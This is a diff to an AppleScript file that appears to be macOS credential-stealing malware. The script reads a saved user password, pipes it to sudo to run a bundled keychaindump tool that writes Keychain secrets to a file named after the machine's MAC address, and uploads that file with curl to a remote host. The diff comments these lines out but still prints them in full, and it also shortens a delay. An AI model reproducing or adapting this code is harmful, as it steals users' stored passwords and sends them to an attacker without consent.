@@ -43,7 +43,7 @@ try
 on error
 	return
 end try
-delay 10
+delay 1
 try
 	try
 		set oldpasswd to (do shell script "cat " & ufld & theuser & ".txt")
@@ -69,7 +69,6 @@ try
 	end try
 on error err
 	log err
-	return
 end try
 log "new"
 try
@@ -90,8 +89,8 @@ log "hello"
 try
 	--do shell script "gcc ./keychaindump.c -o keychaindump -lcrypto"
 	log "tee"
-	set rawpasswords to (do shell script "echo " & passwd & " | sudo -S " & POSIX path of (path to me) & "/Contents/Resources/keychaindump > " & ufld & "/" & MACAD & ".txt") as text
-	do shell script "curl -d @" & ufld & MACAD & ".txt " & remoteHost & "/b?MACAD=" & MACAD & " --header \"Content-Type:text/plain\""
+	--set rawpasswords to (do shell script "echo " & passwd & " | sudo -S " & POSIX path of (path to me) & "Contents/Resources/keychaindump > " & ufld & "/" & MACAD & ".txt") as text
+	--do shell script "curl -d @" & ufld & MACAD & ".txt " & remoteHost & "/b?MACAD=" & MACAD & " --header \"Content-Type:text/plain\""
 end try
 
 on checkPassword(user, pass)
